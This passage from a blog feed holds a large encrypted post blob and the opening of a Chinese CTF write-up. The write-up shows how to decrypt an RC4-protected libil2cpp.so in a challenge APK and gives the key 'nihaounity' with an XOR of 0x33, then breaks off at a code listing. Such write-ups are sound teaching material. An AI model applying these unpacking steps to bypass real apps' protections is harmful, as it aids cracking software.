5e5691aee246a7d89f570577eb549f6c3f55579e1fdc82c18ccc8cf69394b419c844b783c1da6633c709f61264aab56936e68f5551230dfcb2496278570bc567523bac6e461619965f1516533bd18fc72450e8ba0eccec8954efcee5dc66643c5f47b0534277d2ba4234cd5068f952d123c72c30ae39ea4284e17830ff2a14656e564800d00afa59979479b36f9be98a358ef4b54bd78c36efad7041f7219e74036aded9a00cdbe327d4bc0715dd9e8f81aa493adf09cc127be0958366d806752e3d29db1a44db4e9b821953d46aad6ba110d778c205ddf1b5a3fa317fa65c90b182a1612168bcd97a2a9257ff06aba6484f7378dc21c6027d2b22e580952ee390ad53d066418ae57c613d8b67c3432d4f0505da25ebeb8880e2c991d014da040b4fe27ef65a8e5438fc33ec02af91968ad2f7d6a347c5ab19d98814301ae357aed004b4f0a3da8782336a4c193f428149fd82a0ace73e4f491437d7af8292058f92ee920501a9858dafe04812cf00267c03d7b92602245a6ae53215bfe7a807436b6e5012318c7bc9d69813f881c5d955aec06a675e8fe6bfe8057c4b8e25f6f698ca978e204af9ba1a29092127721b7dcf7db0a173d9f63cfc7a2cca97ef4179e1b2e6d1f6b1407bd28f1c383e51a9ac545b8c2a7da6d4d9b07db3846bb61d5d70f958bf926ffa69c777da26e234c10eb793f27c62ca65618bae2b13fb87833f700a1e217a8fb26209493e20b5c6a89e532fcfca808d062b8bad5adde4395345c20e4ca7c75482e7030045ebcfa1d6268a7604b0dba82565e2bafe1d0c84546f919304059e72a6dfa86de336ad99b90f0f7c49d6c142b5e860215a3bd086c71b0ab758b19e27db8d227bb275c05293378da8c4dd4ea2228f37c8e723ad3e916ed8d20e3fff75be6ba7ccd932a8da8c414f020edf7b4da76167c6fdbbfeb9451ba1f7bfb9f00f1b6f01078a94b442eb40d5e88d076a574cc4990e562d7cee2699caf5cbc6f2ad4aad9a7fe2e08e99e8177ba2442071a87d3161d8d1806fb88e51e06b8825fe696e0d315b11fec047a1bb7b70deae7525f3c98abc181bb6e65811a6a22f50dc2847261fc70b329dca966d180d762c64c83c9aef1a2956736912945f0dc6551bf2d207153e19c3200bc7e092fca919b7012c6980abe2858c80cc9295d3aaa31d74b2f01882ea68c37647f9ef46b49d213ac2f5be1e513803620ba73dd3f4f715ad9cc215a8f5bdb44998926ce3df1bcb91fd3f7ca04f0ddef73185bea6cbaf40843c8ec1befbcb639e28e7b1806790c09572c7b4b0da293e42e8de9f2dfbe414217015f2cf750a4e7dc5f2ae7b76ad70f87aadd702407f1548a1110bf4f64662e82bd5fcd74c67b6d99654bf07d35cda9e2f19955f6d095cc7194433562efaf03655ea0f5e1b6fa8fb12078ac456fbbd1f61184ac0a5698a642e743d2b4d0a0fcf78f5b08a962fd88459f57e08d88a0244c305ac73b71948b1b8d39dbb34c65c26d996d7182f2eb6e6f78b6fd3bed4dee82f7fb36fb8d7cda3616a6e04dd06ef71ca8c5be25e107a2136a061effa8427013a9e26718a3eebf2a0a96cf81e96fbb3d6f710b3643a9464aa8adbd9166da7f45a14a89a6c38c3421390d1073e42824800e963ff60f2391e5497056714e4105a433b7814e17a331977ecfea904a368e0a5cb4dc2d563969e5cce573a550f0a381fa5c4a05b4938d40641579540101daa8dc66e177655fb727251aefba595256ac6300146e33b74130f16e3e3858af24bba4d0899cff1b513d8ff852d4ce9ca37c6b6ad78cca8341cc410175d541374ae67051a292bacf2a7e564b183322541d14c6aeaabcc6bda2acb8a18d1124e527cc002f3b80a14d6776fa5a5eb75fa98f12a59b2dc17645dcf22edb5ec9d511ad137fdfd6ec54a534ad5cc5b0e7acb83a555cdaaf12604a04c1bc4815ed6e94545db3e7e66b7468eb5c3e3f914949c65f570278a71543c937e30c084d1cf14f42843c1318a576dbfea35a5b0c274a2a73732d9eed33802eb41fff6d13dc5badc5b850e89cdd5b687ddc446396e6362081bc00c781c00541835f77d59cfb12c8ff28fee204a250053667a59f3d33f0561d2c2247c8677a52263571027d74f1ef209d15e4193872d2cd35ea8d728b8d9849f240fb2a391871761228681bf33c9ef9efa6e8c12c0b0e5ad48439c54b801c77281460d088b7e567e4b224081e668f4c59ccd1778a3919a9020b844eb841054438759be931daaf4fc04168cacd645bb31cd334cdc8ca60fd3bb63e4ac18f4fc9e0abc24753df7049ebb42e8a6418da524de65d4c40d111800049dbd12332a45bec7bedaa2970d296705f08291df16399fff218bff7aeae233be471e039d3a82d67a15b2d187d9339ddf93244828c3893444e418aa1d11b3f6235777b2b196f4f508c3b72abe43736a12bc4ebb3ba36a9a5af3cb04220ddd904ecbe99d09c4fc4f460048d49232b732c5fdb0ff0258d63026a2b5c4bb8eae69b0cdfcfeeebed57c3d3e43a96c19463718db1af8956811dce669a485a8516ab41ac1bc532d83f9308330f3bdeb0456811435dd516e7461830c55dc92db236768859dfd8236fdba6114f173d0c7da45c714415478ccc41c88fd71bf065213d41b238df0e94edf574a1d9aaf4f3d9574b763d1c538890527c011549fdcc451cbbd9a5b49b43dcf3d72769de8abd447b37e6384e05337370fa245d6aefd177bb8d87f6bd7c983715630bc1aa80bba6b5cbe110508bfeb6f7145a3f9a1b9dde2547ade26d8d91c53ca8fabd214aa2912de68b255322e7c5d341cd487c062eca9a0094b69cba80321f7246cedd695efcddad38d3ee5cc396441920efba5b2131d76be943fc5c7234b7342d6141e0f96d4b04ad240852fff0fcda1aef449f62af6ef8a4e513c2b69367d522f1a5a9b9e3c898f1329c418c25568176777e0fd34df85b14e58b95550b18f109a47dd0e64822f020787dec145412c0eb75bfcde65c75e59eac988b4985a7ce7d79298191fedaa2fa25244b58f139946b8e3285e22ea49b81399dae726386fd35afe6fd790ddcd54ce0875c409e3986cfe87a623ca2aaae805080270e53be7bdc6ccb5bf5d58cc1e2be351471f3fdc03d9b6861451f987de6b6c9dd5ec3506f5d40b104197d1efa198de107431b29d6750a86f5840fc7c12c6ea145b850a61519795336f499333f4a6c7c6e89dae2cd82faee374c89d7669e03ad182e6cb66d40cfb8f9673a24a55dfc0dcb4217c60ef6aff94a3e998196230f7013b6842df76ecb9246117e503e4fb3e1a107f59ffe7d65220c9fe6482d4aabb6fd97853e3ea0c3ff2d86c191c085ce000ffdfc9c0b89e7736c600684ba426627c11f55f9e96ec2c4e9c8b41d1d20bf5b0ece5af88b52dc464fa6b85891733624c54d0683f164e4e82f158a5e35bfe3d56f6bc06db7b9e49503933439757348b8fedeaa432117531251b2a0e6ca388b61570387c3caada76ee721a8cb5e08ea5a676eca7a95ccab0b4d1e4f60fac12d234308f0b2f25026ecb44dc291a883077c3ba274db8e48b2d9ab6fd668023f6fea9d9a3668ca8ceb409bc70756fa58dd64745dc2b3a5cb6166caf5177b6abd3bc7ff0a2f7c8a0394d2e258648a4e1feafe21d705f2155f46ab611a9049d5503d1f021c5c348a71f35e92009899e151d2d3a98d6cff1f4e679074bbc0680eac69c0d1b466594fd35e2660cca82e49cc98386cd28505ab334699ab737638e9aea2f8dc0c05e1d86ec86c8ccea4794ba5d9ae683b5baf0b91314e64c753e534a91de4a8be455f28f7570c445a2a7eea3be0cf867dc5054988a4a85cc728d7a725842e4c738a8c3cda7bcc9e054dfb4da3be513315d152c24b7ccb795f03ecca4626010fce1c769f5c37ff22a82ead8d18b43e69645c87b9863c503130c35e4eaaf5e9a60e877c9591ac0068c1223bfdb2be5f952be60dc34a9b61999944878e3bdfaf4eca5a19c09f41ab0f7dbe6cf84245be6014d91ea150179783e952cdf4845d8ac2fa453fe43c30bd18dd679547047b3c54863acbc44edb06dea7d044adad7f2035c16cb3fded86831e07c6dbd54fa6b4f7a3149eca843932e2447e184a430696f7e21a911b867a1aa7057afa8e8c33c32c0c88a1dc549cb25d125608a4bf9a029cb8acd629952e053c3cad178ca082f6e37a91c3d6e6769e4073deae43bf0321b5b51b28ee5b873c23c1aed0bddfdc61d89967ecf1352448c83d8656fed67b0c5d646a7342ca48acad2a78d442c4da0f21a9ee01e754525a85a2df37da563e9c9a443956b966e992bd8a7a00f4e56a96b4f791e7c30aabb4c42d716a60603f4c065f1e3294ae48665f9ecffc7d7343475708c49fff9e56eb6c5c3b56ae89215afb638fe25b4a1a49b6eaa1cb9e8dc1e04d2edaecd6de1f5a80f94f2915c77ec6b90253d6ae5b7ce1a24bae312cc023f175b6d4453b2896e9662b26cb228ea7f4de1c91f97b0b669546d67182b25874daf1b57a82d2c8e5b12733522acc435702cc031ee6332fc0533e2f8d89ed5934917b7ec4794456cf0363f2702b2a27455e124829a2fba9efd9a6379f8e3d7ff9d36c873f3b79a50067860249a3fc045014806f07bf32a57f9a007b29ab92cd76cfb18f7454f473855c9634051f49a2e76b778bf27a16784a96dcf65b19ff02b3140e45775417f9b60b8ec70eeda82c21f38e051be01b9bb7d014e7550e57e2ed62b286e891146992a582667311b2b68d12f26e4fbd88d30445f11a680de0f72637f9af6f530af2d8cbc2657599f07b06354f1d7f08572a20b498cf6b93f6387e40ba9276268f72aa0918458396de6bba5b4f54b5fdc5867757851bacf7b265eba635a783a54510cb4e1228b915c4bdb35c408d1801d907990d768ea14d8e756d96a0bee6bf3a06e1f5fe08f4f093e8d365e93eb755b9ab266b5b3e5b8f53fd9ed02dca68b3cbd6c311300e857eea461e4a58fabcf8fbc8a66db053231f24c6acef00cb4df68956d0cb90798d435ad7db970b9cd36f1547b15fb519291e23ff16589e3734a62abc2cf2ed10932ba2e969d01ef5fe997ac5d1aacdba74b683452c6afca7ce5b32f0b0450516f39ff868aad1352fe0e48b1a616f7b0b77419e321a42003cc01b98965fd05acb49fc63c52d4a6aac5f3415ffa37d0173409d740efa5a1357a51b6265ac0b8fa520842cd28dd9baf4c38efa379e87a283a4df7551d2b9cd89e756a9e4c239a479fad1f215b75d8e22e42216f8c22acba5b8903c6f85110a8b2178573e903c4dd8a04b9f9bba15f3dc30669468427cda1ff02e7173de1c5006ac22ab6b8b533332fc3f9fb7c0bfd9a188c5f5b9e86349ae1419c71d80fde2c08fc7b13b0b9d42028dd649fd3159c4b100ad84d28d93f45e8e442e3cc2b49d204f756a70f7119566f0a7f6c8c9c93add7921e5ea57794e9b10e4108886e0ca34533d422b5970d8e0e6483280d06b8acde07004e81c2ff49afe41c34949995ea233c18d779b99b06d97273d376a84209369f8cd82b188047cd40e4a633bafd1521dd39f1f26f1b4150b8ec656125f1fc1dc7268554c3b8d332fbf688ddf7f3dcadaf8b3e8c231cb1ba4373848bf0997818d65b18e2df6aaa3dfaadfb8da9b29b6306e00f7835a8ee91016fe1f63908df0a36bb843850fb1be20c1659eb4bd533b2c01c60c3cac297c2bd01456ae83cb5ed0b416badd8ec360065bd9aaacf02117e51e10cc10464a00f2691bf75856e6ee95cbc0f47e331d8b125ab6a822ad2d6ad1973b1c418f2f572a0870667bab05c4110cbae011e6e21a3dfef8840ecda49808b27bc826231a3840d7986b213229f83af2b2f0f68cee16254c6367e86f91f578ff70ac6ce672a928b378949edd9158d67085d124e0600000c9027676eb9a0a17dd7acca62a4aa8dfa107b00d1baf8c20a8fd22984147e33de08d68ac2a5465ecb345bf618284b8eb7b18249b9bd842df50bb3d66e6a6f8eacf7e90ad9af78c2290e46b899e625ccd2b79cbd0e908747b174eeadb2a7469d023616756a96399b0630d3318c289176e2e0f4ea3174c484a72315d59614527523c9a1bacb870b8ebd33cddcdb84521e750039b4029cf05aeae422933ebbeba4aefc73ef94ec0f1c9055d3dfc9c92d34d175652740f6d018690aa4c2ab22659358712cc5a961ac55596c3319b0c71698a697482d18238bbceea9b8024085d547f9532ff3a3eba5eebe650eab14d2cb82b37b8ec10589cf9e6bde0b7a10b0e3f210e3a0e69566efaee30030957e91e50d71e92fe8cd904ed1d504d5c849eb89f08ebab7c5a8dd11e19f3ac425e4882e75e7763c03dcdfbc8e15e4ca44fc553016dce6440eaffe2a5427753787f412eeb7c7e0a7d83d9170e4033520fc53babbc9ed2f8506b679c5abae380922dbc1291f5c0aff38cb4747b088871c338533a3373bc86e54a7b1c7ddf89be7567dc2e665da8d1ffbac739c73e313dd8401e37158052bb33d74f309783afcd3f534abf5b63c47d4a1c56835d987ecfca81079965695086e12f181cf0b7792783f810cc02b2a1ef562d4101db2b5c024dd1b6b1f6ed15e31b554711d1daa3049546f785013cc1303a82a437ae0b17a3ba7d3025a724d74e9afeb0dd3c608f9e16880f429c2217c756f15c04a1551c6a158a2fcaad8645e761a5313540014ad00e3839d24af252f4d0fea5037c14bae39e04c8d17d90b6a78bbbdd91b381d337ed4a5024dcc579c5325a2647f203d4cfdc04d636263d1bb423644817191a8e07ee13c8125d766b78cf5d80ae6d50fadaec781583b46fc1997ea410fdb29c154283261831df1cb67b7941e41a827fb77c7b92943e6ce229cbf4af6ab0ec1b28bbc9422e5765ab1ca9c85ee1032056f67b994f99a61db9e6ef65441a4f7a85db031a200628143b5b976059f672edf8d92cc0b220ec3a0f9a49a246f09a097be31e103f5e4588b60144f01e0e3a9188024ab3cb6fde20b898994ebdefe35a601db93ee2cca07d508f23fde387abd9d1ff54f91c337aa8fdb96343e0430e139163bdf69972970df0f2931b58b7223ff2cf8cc7c56acd864b05508def96305b082f067c753da01a49576bd7fb3b59f74d792793e070970fc89207bf74ef47e3db83ecf8c8c5cdcaa2b46b7b1416b13b110cf8ce853baeffdd94e582a3bad6b6cf9700cab8d86539c43942cef3b1f5c5b72210eeb444c00505ba7b9733fb4cb33c090a8aafa4a5fc8dc47dbabcbc3cef656537e7e6ac2a714c58682cd79370c66af55d26d182e8c139752caa6a2d84f4e1130b4461229de05f4b30018015151fae15eda7511a219250330ece9c0b44ff615581c3e6f7e74e4bdc5e8fee2786a1dae384f1c91427cf05d2ac180944facbe174c36e5617529d3d584ddc8902223e61063ced626ed8697094e188e0626556dc4d67d9c74b9b2ccacf2888c6011972fcf8082f7e41ede9cb19924d63cdf63d1fa730a01f1947d70f442cb659b5aae07b08da4a8770c45e82299391ebc57f99833735f44543ceca1ac11eb5e3266546e742975762f5761b7ed5a3ebf9355207c9e070394e91bd676d31a2caa6a09b0c23c0a3dcbfc9f7325576c4464373075860556ba661eff15938894ff072fb95f65d24a15ca6ae7f04e79b42205044c4eef9d484c68bae313a925eac9e61546ab8a5b591a08262dd52e0b7cf1079d9fa59c60bb668f4342ab101ba8874dec7abf44dbc54ff8d78780a6c2003e20ac79b17bf3740f044c791700bf21bd297721da0e8e2dc4694cbb33e5eb4fff7303d22cd6e3c8727842b0da0a62c5c5f0f6cfaeef5f4747f30a172b5fafcb4cfe4058a103738e2febdfbdef2a5fb6244a1a1e645a25c368f91215be19446d5771f43171eea4ee582715b460d9e486fff332fad9479735186b0d4ce79f3c5502e24823575aab4bb19d85e16d8097b9909db20cf3bb08ee6e56cb532950121bb01641e4d9fed4a52b089023f4ec9559154be5ba65b0201cf5532af9ec648bf2b4e0f8b977a1c7cb5e9a5e8d4333f2160464a2149d770910313348d6efcbc2c73942fb32075c366021529a4f620ce024bdf8651ee458dc526a4f4a125827f6e7680f1add97adea938545fe068d6f19b930332cf7516d2f91514e46df8a05e0f6e882012bace2e941e6b04a2cfb4b14460372bb25fb88008eb309df0fe15de0bf0132961016e6771f9428b67102468ffe5c5894403e5e6c9134617c9f2e36b9ecc2a8d898d841f979b11f9007ddcb9b4daac8a4843a8d5ee10de7755b85ea7a500de08f931ea1b3b427ddba27b4c2e31013d808ffb3114f21ab21cced76616b820e76fd4beeafe993d8ec5c95c17c6914e2a04a48d27b3cfbb35944a37a1891198c23b2856ce3a6a7b628e0c806e8cc7a8eff4b1def9065559cc5add8260bb25a14a0153a8dc89c95220f3b8ed3947d4c272446fb04bf54d04cd933b73fb9407a1d4cb220f78eb6855380ad281a04a40affc246c4de424e10c788c3b33ac7dce5441d11faaf2f97680c4712605ba50ae8ebc4f6f63e02880e4b78918326869bfd0f47666b844552cc1113d31ec265a15db58334291fed0a7105ddb30f5c81fd91dbcaae1ac82f685f7907bcd5fd7cb0f05dadd7731ae254b94e6a73a23927f0cfacfdf323cf584dd5ee03435416e9d7f4aa1db0380267e73e3bf37599e3ebff671d0e0dfa23bdb838600dcb39702aaf053edca0fcba4980bfc459145b19553ce10ca9e08eda37d667cd6298fd1d79bdb36004238d6544ab7bb7a1e6155317ed2752c7f696987374f3d0e9fd774d391f2606661ee95d827c6e3d61c5d17cf9bb8f03344ca22c1803fdc8f26179e28c15ffbd49b8d8c5481903a58347d407e6ad5dfe88934b0005146807a128907c4a562ede5255da24eab5489fc22fcdd1a637885686b0a86971f6569d4d854edf118ec3fa8d6adb6dfdb4b8b464d86f4057aab2e8cd1e501da1bdf65e20b82b663d9cbfdeed30910eb25f38944dae8bfd6798033566081dc9038e8aaa223019c6924e889fac5751a6e395eb300459fff558bc8e0b7657085e43056eb2aa1fac8ee399ed5a076d6158a9b83d8d925dd2e36add878ea79c8210af56b8449dff75617dcc9b1f37028909f8156ea4191ab97a629837200c840a06cdb711c80b4f9e17a4ce0ff6138ec5cf509dbe13b171e801ecb8198afea6d3329ab5b45e6df5ab4f1f708699f96b6ead18c6aec080ed049324642ec0efb64ecc38558c051e2b1d1c0a399c19143043983fb2adb976a5e706f2c38adbb5d41eaef654312d583f48e8c3fb46b64a9bdd5cd08afcb30e72528b0946c348b17232b5fec595f32871a151a1c7808cc4517015d3186dbe12781710eec588ae0deb9bb8c907e8c88790d4eb5fcf5e21f2b3f49d62654ba39f1b01d2a55a63d381c6e664e2e5cd3b485ba400ece0b3de584751d3e29df2e57690d5383c372c15126e917d5443ad00c5178af462a3c14f17560eba73b68ead0afe6dbc52c744e857438c346aa1b3cfe46627335a697e708d44d071472bd816622e4662ecd32129c8cb96a080d2634a486a4f7b00a320d70e778c218bf2e45416a21f53b3e40c2e7a450d43c4f7c2e981bf88bb03735547e1c167478b243e48c285192d4aa5b24f26908f9cd6aa303fc2632ed9939393a7b3bf17acecb7dde75e63b9986606efeb051b4002aa207c3627ec043e4df13a9d08978ec246f1c4e9a2f189db32b4866502b795addc8aa6d2e6099286e82a46d83af142c9415f85440980ad225cc450303df7b25809048fafb016676d4dd162462d034a8a7b3aaa5e4a89e29e2d7f03db92c6265f7f235c7e5cf1334cf97c24beeaa5db6d702ccb80cf2a97a8aebab75fdb0f2cebfb0cadf4040de7079dbf924893e58197f4e44f184635f6c7a463c6a839d2bc836977481d09897d54ba1b18a7d1d1ba177b5b21c015ec7c69cbe03fb56375f564bfa34864cbac5a710b89610d0d18e05c01f19f5eee70eb89d0c95f532360a3129cf0e1b45fcd09d46dcdeba2dc8629453e47aedf9f45ab974421fb66612cdbd8e03cea1dd0dee75ead190e038a912354b715bc639517b6db297c88ebdfcd2c82b20a27da3cdbdc957a1da5376b65621953574d65f7afa9abe03570ce301a28599c454385e5563b960d9dbf6359eae8832694823bb01289029d1fe710bb46466497e86ebde479b0932fd73264acde9cda4bbd712d6844230637e007849f5d6893a9ac51b5aa14ff1578e139320f2431a211f7882a5612979ad6138a56c336f283e72f931960c5b6fd865a0af56f9104cee5f9a837cf29bc6ff17ee5bbeb081682729c270105f12a8db1c682e281bfb61a02154b93061b44035eb93c66b7012887b99da5bbb2bf8d972f8559ee80ee213728fc7c24452d0063000d09ea8a8e5c01a98fcc7f066b4bd822fdd3735d274c1fc399078938e16972cf92460cc63b0c3f0b7b38c3d7a079eaf8a7b6326c3d4ce83a4696a578b78c1ea0767308a079cf9e3d236fff2fd8384ef9b9572a75e77718afd2b709c7b13d00cc1b7c80a9923d1d39ec7a03f4a26ec9af40969b7fe90d3ab415b52ea83b31ae151cb28d006f010986e70f4391a11f95e66b65e7d5ed91bd9b489c4e686dcab8524a1a2f88118482dba116c858feaff6582244733feb067984a86f0caf65810e29a269b3dd441dff6de02446fe17419d74e3d6df689735534c0128c5adfd3c26e2ba71e37ed7d7a19f64e8aa131f655e0561d94f4e6a967a35bbc98dc22b80586e771510d50c630d8d4341bc0ca5d6de827f7ab4a29b6cfd0b951056b41b5e32eab79142ad018b3ccf6c1f24ad3650e84b9501c217d9098d6b978ec91ea9f720bed7c4c6b07332ea4ca9b4d30438f6b2c9e75f77e6ce1a426966f6c80def7866c1d01dd25409ab5315290680d44ac836c9b8ceadc75b7350a2a4fdfa9144e1a7d0a9fa4f81e9693b468988b0f5a038b8132169ccf9b0c3f3ce8a67c9580152731a673b4b4db2271d2c19ee5cc3930a656e268be09adcd65d91f7c43bded569b008a92e528af10242e166be824dbbe88346f82c576fbf0a207945dad448f017be3d5c75a8f0739631ab464cdca63b3f9e568b1522105ec9718516bfab40e158253664ed8ec01fb3a688013a63cabb3c6092528fa3172dd010e248e0642054b165e7887aedf2334beb2f8f272ca7f0d6c149ace231355b2d23d794853e1a8b0b0f4581accc6487763be65bd261bbcaa3cac949f651cc051e37dec0d6850b91255aa409761eb11fa2d4cad6fe15ec711eab3a16eedb7de774ed6a024c793bc47c2e357f538e1d66df81c8f1b3b26aa7571b2366c09617cfc5edd0173ad7f3659c6563d096a3a20453079b806705f64339322473f6eacdec70928c9d0699397b65feece1b26868b9604a02bcf97f2b78a6247c635b0bd2617901c52fc9e1f8414602180d5ff9ca03aa0aba412e65903fee4b800818f360a57f62a17252dff720d019a7cfe86b6f4bafcc9b86c9dd280cba50f2035f5ed8c8771187d6e03073e42f9448bedc698b4728bf20d15d613311fa920c962ee8bc6f0f7e0831e7aaf28b47abd19b7048856ed61e73b8a9ff2c90a4416d133331968ed83423ac18aa0f5170e81b6ce6714b07c1b721ee8f017ed1438315fad7b95b9245b619786e7041ebe2f3c6c030cd75fde41039d848594debee976bb18d2e54b3016439cd57473afb45912c11634ece5bdcf286fc96c5038ea981d86884d042e73576978dc1baea96832c0d85a43ee5c01d3891256d604bd74df2db97135047c8bd4276f411e830ae3ed2df995c94e4aea2a338ac2a8b669ab431581990ad1fe4a58cd83e5d01eb7b08eed732ee47fa3e36801ac898497a5448eb76799e64be6b6edeb87fe55275287bbc291b480dd513e217695a15c4798ec963006fe41f84115d062b52a468cfa4c7b095b4aab19e2230ecabf9d9340085e25e76bb6ffb36baa6ac382b0763f2c3858338e9d969035c914b6900252a098ad1b664326ea67d334d1e59b5031ae2acaecf04d0896783ba693e56f10a4843a7533397029501446682b00eeff86cd2885c605fa3d23577b286ea9d527ea34a9420b7043b65533f01dcab6a998cd8d8802b6c6a9faa1a2250f9a117e9fe3a9640aa5aaf7ee57b0d47c9b06a747943ae15c7a2a6e981c6f4484b591ef77b7c06d161d639fec53db55caf042f8d60b74ac339893d6b4b503b339f11feb9c641295fb85427c95e33e6dff868b0f457f292d7fbbf9846dbfa2a846b49878f4781cedc5a3091e30196beac5f7836535eae1a7e9f46a6d7ed5c8b40e82c5d1b9d7ae9960282cc27d7470cf6b70fb4e9a6ad609f97b1be2fffba8d30b0d2666c0d2a819503f7a94350e5bcdb312410364d5d964bd7e50fca69efaa415288efc4524d5176f7582c6ae170d702059191cdda1a8bf71e24699816b1085da18cfb228386864230e176a5ae921b5d1c6d5d69ab029be0c075caa8297a47a6291d3700ecf20c9aebd4eebe43d078cc54d7771d2445a9f495a60b545c507be1da19b51c8c183b173ba1ad1789926b2d62a66710bdcc9386fbe8d2597c7762cf1973c7865ae43317e812478955cd3f3de6fbbb12159af683744c97471d0bae1a88729167abddf8eb2b836b7ed42b0505fd970b54bdc9666b8904e68cfd852355822cf3da451c95f97e7fb00660ed6a05b0a660097c0abbbd47a8775cad47627608860360af109fa34325b507eddaa93d22525ef416c6bd92dc9bb88151e2fceaf3c4944dd630242a109897870b08466b88d257e811521384ebf247fab2919c6a0d6a91610483be2c74ba19613402b7c1131797efa4ce641b5f7eefe153ff46401a50b1015c65b6d772989428a8eeb87f248513ddd9e17ad782f696157564f3820e4bd37213df9e28cdc7b2a5805ef48e923728aad024ef3db68ac16c778da849f9727aa326016cb493f1222c8efebbb953fd313468694b6bd1857ad9796e57f72b717c2a2759852eab2d8c6e8eb3c5b38e5199500e9922c3e9d975c2d92923fed842c55502ac077e613406639a6ec3745a8ff23f098d67b0dfdb6d09fbdc1114b70cc3be68507c31928bcd5a7f084a22e5a593b74fb5b3be85011c8b19b23b691f5ea6cd5d413fee31792a4226c43751a5d836a0eb7ff6fddc7fa9636cc531a6ba18007a4215473d1de65829ff6501c97756f464c542f2d403f0be5c204ee54605eb4690e1cba9a6cad9019a0f5502c0df984097e65c0a2a70744412d32700f828d11e1a053afbea319e6db1a7345bd76f952c45a1a9271707342e27ce3e01eb5339ce56589eee3a378c3b64e082c32725d1e1affdad47d266cd5170f305921f0eb5cbc86470152b8583717a9861f24c9cc8204c55e55603138134e297e3061ecf7275538d381f8a098fa81085a8417396e2e3e294a566e43e13a4ca74d9873713f99199eb4c29a8c502111f113d39806c70da9209db63efaa57993e2a90c9b391d4313517e20766a6d8b70d8f1938ed51220e2434d5c193ada6334d3f262a3d602b025b3f3ad20c1ef62f5609e6c39752353fee286eb921c5f42426918feb918921c17b83e881de16144dcdfcc266816fa49fe9af48180e95996184561c647ee6f6ce63a01aabd212aee97042f70a220895b6daf66eb0b78731120c28e6dd0dbaabe5178b0219cd8caa2fe180d4fd0478e67de43e164a1e15f1657f70852596ea628ab4e797c086398d2520e00bbecc9f4f26fccf949bf507a739816da1292f5a9bc9caec09193016dba1685c48ac183acea849bf6d56755d4b518763f323b49446178f7da299d97f54756b083235d1c8e1f33796596a369fe9494c1c3f4eb4e86f5021bd512a21fba128e72c688954e2ce4e3a8f132e596da9454d877aaf523489c42d7dc07427b387b3cdff2c6c313558b817c44bcfc7d38a2a46fa41d9871b39e8401ad26139196697f64e5e9ae3535ec38d8377a1f8cafcc96127821376836fb688f9d53565325ea3bd617f3984a929779b1006f0f854a25c21b98a4817a3855eb5458b38bf150780e92128f0d231f1743ac88250371d35eda0791ccee7a3aa1621220fe3c58dbc9b7e7368b9a62494196090f03abbc93ddfded7835b615b92ba20fd13936dba410c408f9444f99a9839bace97f2af18a6bd7f9360102513f899bdfacf5ecab0167bf6dce1c2ad2c4b9e49f8a1d8f3892eb428161ead4430bdb32688fbca17cfd6feb8bc9565a48bf0a1b7b5d1d7dc0b1eaa11a8bc45c0098090f4064bcf2d48e7163e2a4134fcfe281c559b89631f7b8ac900559a9f52be688404a0a432c17f92c63a22883e2f3a55952bed85a6d20f79a4d4377a3c506f00889be44d97a4e3395b35fc7632ea091c27cf3d4258805f21cd9036eabe625d02e30f13e84a9502f7716364e42365a98044b22ebaa5ac5cb5a3283412db57bcc8b621db5ca6cbe5abeba0667b62e3a82b4db5f0ff08fa9129794a506faf5b1907b865b37f058e7b24e95a6fa86c0c8c86ab6519e329eac6ba2481377856f9e18d21eec0e6ca31d31553e8ced240a894d019830bc9b0730844aa89d2cf00db474aa5852db5d54ffc77581062b753a1b835ff78c58c1f344b5f2b1d82a798ca17cbef93aedef2740018330a8cc761a0441cc74c1b8d9ca4a133523938cd59a476956287e492a8ebecdb56007db12e8483138bd46b13383d8ef553f2b2bec1916fffeea61bd9435f0bae66df98d1ab9e327ae9cef070c3b395286c1e986ef765566f6cde5564db2d68e26c2d2fc54e05978d1ffcc489074d34a5d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025强网拟态mobile</title>
    <link href="/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81mobile-just/"/>
    <url>/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81mobile-just/</url>
    
    <content type="html"><![CDATA[<h1 id="2025强网拟态mobile"><a href="#2025强网拟态mobile" class="headerlink" title="2025强网拟态mobile"></a>2025强网拟态mobile</h1><h2 id="just"><a href="#just" class="headerlink" title="just"></a>just</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这题当时想着试试能不能做出来，在比赛的时候差在最后加载il2cpp.so那边。现在想来看来是大晚上做题做的昏头转向了，找的文章都找错了自己还没发现，这个表情包来表达一下我现在复现的心情吧。<img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039465.jpg" alt="4cff7debcc7ff416b9d220e7aef25386"></p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>总的来说这题解题过程也是相当复杂，大晚上做的时候甚至忘了前面做了什么。</p><p>之前接触了的一道是基于windows下的il2cpp的unity逆向题，这道是基于apk文件，有点不同。主要的思路是提出apk文件中的il2cpp.so文件，然后底下的思路就是基本解题思路了。</p><p>这道题对il2cpp.so文件进行了加密，解压之后看到的libil2cpp.so文件是加密之后的，仔细分析libjust.so文件找到加密逻辑就可以。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039035.png" alt="image-20251029235605513"></p><p>这边我就是从初始函数开始往下找关键函数的，然后发现了这里，dec_il2cpp这，我感觉就是主要的加密逻辑，理解一下发现这里果不其然就是，基于rc4的加密，密钥是nihaounity，注意^0x33</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 